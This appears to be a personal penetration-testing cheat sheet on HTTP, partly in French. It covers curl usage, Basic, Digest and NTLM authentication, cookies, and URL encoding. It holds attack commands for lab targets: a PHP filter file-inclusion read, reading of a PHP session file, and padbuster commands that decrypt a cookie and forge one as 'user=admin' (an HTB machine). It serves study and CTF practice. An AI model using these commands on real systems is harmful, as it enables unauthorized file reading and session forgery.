# HTTP Protocol


User inputs
- URL
- post
- cookies
- xml body



## Command line GET & POST

    # curl -s "http://192.168.1.23/?lang=php://filter/convert.base64-encode/resource=fr"

    Curl options
    -s   : Avoid showing progress bar
    -D filename : Dump headers to a file, but - sends it to stdout
    -D - : Dump headers to a file, but - sends it to stdout
    -o /dev/null : Ignore response body



## HTTP authentication

HTTP also provides mechanisms to authenticate users. There are three methods available as part of the protocol:

- Basic Authentication: the username and password are encoded using base64 and sent using an Authorization header: 
`Authorization: basic YWRtaW46YWRtaW4K.`
=> `admin:admin`

- Digest Authentication: the server sends a challenge (unique information to be used), the client responds to this challenge (hash information including the password provided by the user). This mechanism prevents the password from being sent unencrypted to the server.

- NTLM authentication: that is mostly used in the Microsoft world and is quite similar to Digest.


## Cookies

````http
    # curl <host> /sample_page.html HTTP/2.0
    HTTP/2.0 200 OK
    Content-type: text/html
    Set-Cookie: yummy_cookie=choco
    Set-Cookie: tasty_cookie=strawberry
    Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly

    GET /sample_page.html HTTP/2.0
    Host: www.example.org
    Cookie: yummy_cookie=choco; tasty_cookie=strawberry

    Note : Debian Php stores cookies at:
    # cat /var/lib/php5/sess_o8d7lr4p16d9gec7ofkdbnhm93
````


### Cookie : Padding Oracle

Le cookie chiffre des info avec un code block CBC qui présente des faiblesses.

- https://pentesterlab.com/exercises/padding_oracle/course
- HTB - Lazy

Detect
    If you log in many times and always get the same cookie, there is probably something wrong in the application. The cookie sent back should be unique each time you log in. If the cookie is always the same, it will probably always be valid and there won't be anyway to invalidate it.
    Now, if you try to modify the cookie, you can see that you get an error from the application.

Decrypt
```
# padbuster http://10.10.10.18/index.php ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N  8  -cookies auth=ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N -encoding 0 
```

Encrypt
```
# padbuster http://10.10.10.18/index.php ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N  8  -cookies auth=ICyCsquiFJ68tgENEeoN8mkNMKSGQZ3N -encoding 0 -plaintext user=admin
```


### Escape
````
" %22
' %27
> %3E
< %3C
+ %2B
````
https://ascii.cl/url-encoding.htm


